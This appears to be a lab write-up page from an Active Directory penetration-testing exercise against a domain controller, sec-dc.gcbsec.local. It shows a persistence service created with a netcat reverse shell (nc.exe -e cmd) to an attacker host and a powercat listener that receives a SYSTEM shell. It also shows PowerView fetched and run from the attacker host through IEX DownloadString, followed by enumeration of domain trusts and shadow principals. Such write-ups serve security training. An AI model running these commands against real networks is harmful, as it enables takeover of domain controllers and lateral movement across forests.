---
layout: default
---

## sec-dc.gcbsec.local 192.168.144.1

From the sec-dc.gcbsec.local Domain Controller it's required enumerate the trsuted domains for unrechable network from it.gcb.local. 


### 1. create persistence sevrice in sec-dc.gcbsec.local

With Enterprise Admin Privileges, create a new service: 
```
PS C:\Users\syslogagent\Documents> cmd /c sc create REVERSE binPath= "cmd /c C:\nc.exe -e cmd 192.168.100.15 443"
m cs raeRVREbnah cd/ :n.x e md1218101 4"[SC] CreateService SUCCESS
```

And spawn a new cmd to the attacker machine using netcat binary:
```
[sec-dc.gcbsec.local]: PS C:\Users\syslogagent\Documents> cmd /c sc start REVERSE
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```
```
PS C:\Users\itemployee15> powercat -l -v -p 443 -t 99999
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [192.168.144.1] port  [tcp] accepted (source port 58753)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
Microsoft Windows [Version 10.0.17763.5458]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
sec-dc

C:\Windows\system32>

```

### 2. Enumerate thr trust domains for gcbsec.local


```
C:\Windows\system32>powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> IEX (New-Object Net.webclient).DownloadString("http://192.168.100.15/PowerView.ps1")
IEX (New-Object Net.webclient).DownloadString("http://192.168.100.15/PowerView.ps1")
PS C:\Windows\system32> Get-DomainTrust
Get-DomainTrust


SourceName      : gcbsec.local
TargetName      : gcbacc.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Inbound
WhenCreated     : 6/21/2019 5:04:37 AM
WhenChanged     : 4/29/2024 7:00:16 AM


```

```
PS C:\Windows\system32> Get-DnsServerZone -ZoneName gcbacc.local |fl *
Get-DnsServerZone -ZoneName gcbacc.local |fl *


MasterServers          : 192.168.79.1
DistinguishedName      : DC=gcbacc.local,cn=MicrosoftDNS,DC=ForestDnsZones,DC=gcbsec,DC=local
IsAutoCreated          : False
IsDsIntegrated         : True
IsPaused               : False
IsReadOnly             : False
IsReverseLookupZone    : False
IsShutdown             : False
ZoneName               : gcbacc.local
ZoneType               : Forwarder
DirectoryPartitionName : ForestDnsZones.gcbsec.local
ForwarderTimeout       : 3
ReplicationScope       : Forest
UseRecursion           : False
PSComputerName         :
CimClass               : root/Microsoft/Windows/DNS:DnsServerConditionalForwarderZone
CimInstanceProperties  : {DistinguishedName, IsAutoCreated, IsDsIntegrated, IsPaused...}
CimSystemProperties    : Microsoft.Management.Infrastructure.CimSystemProperties
```

```
PS C:\Windows\system32> Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}


DistinguishedName  : CN=gcbacc.local,CN=System,DC=gcbsec,DC=local
Name               : gcbacc.local
ObjectClass        : trustedDomain
ObjectGuid         : 55807cff-2ded-4096-af3f-7511048e5d20
PropertyNames      : {Direction, DisallowTransivity, DistinguishedName, ForestTransitive...}
AddedProperties    : {}
RemovedProperties  : {}
ModifiedProperties : {}
PropertyCount      : 23
```

```
PS C:\Windows\system32> Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext)  -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext)  -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl


name                    : Shadow Principal Configuration
member                  :
msDS-ShadowPrincipalSid :

name                    : accforest-ShadowEnterpriseAdmin
member                  :
msds-shadowprincipalsid : {1, 5, 0, 0...}
```
[back](./section5.html)
